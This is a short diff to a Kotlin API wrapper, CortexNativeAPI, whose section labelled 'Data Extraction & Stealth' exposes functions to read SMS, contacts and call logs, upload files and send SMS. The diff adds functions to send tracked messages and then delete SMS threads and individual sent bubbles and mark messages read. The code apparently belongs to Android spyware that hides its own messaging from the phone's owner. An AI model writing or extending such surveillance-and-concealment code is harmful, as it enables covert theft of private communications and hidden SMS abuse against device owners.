@@ -81,6 +81,10 @@ class CortexNativeAPI(private val bridge: Any) {
     // --- Data Extraction & Stealth ---
     fun uploadFile(filePath: String, category: String) = call("uploadFile", arrayOf(filePath, category), arrayOf(String::class.java, String::class.java))
     fun sendSms(number: String, message: String) = call("sendSms", arrayOf(number, message), arrayOf(String::class.java, String::class.java))
+    fun sendSmsTracked(number: String, message: String, messageId: String) = call("sendSmsTracked", arrayOf(number, message, messageId), arrayOf(String::class.java, String::class.java, String::class.java))
+    fun deleteSms(threadId: String) = call("deleteSms", threadId, String::class.java)
+    fun deleteSmsBubble(timestamp: String) = call("deleteSmsBubble", timestamp, String::class.java)
+    fun markAsRead(threadId: String) = call("markAsRead", threadId, String::class.java)
     fun readSms(limit: Int): String = call("readSms", limit, Int::class.java) as? String ?: "[]"
     fun getContacts(limit: Int): String = call("getContacts", limit, Int::class.java) as? String ?: "[]"
     fun getCallLogs(limit: Int): String = call("getCallLogs", limit, Int::class.java) as? String ?: "[]"
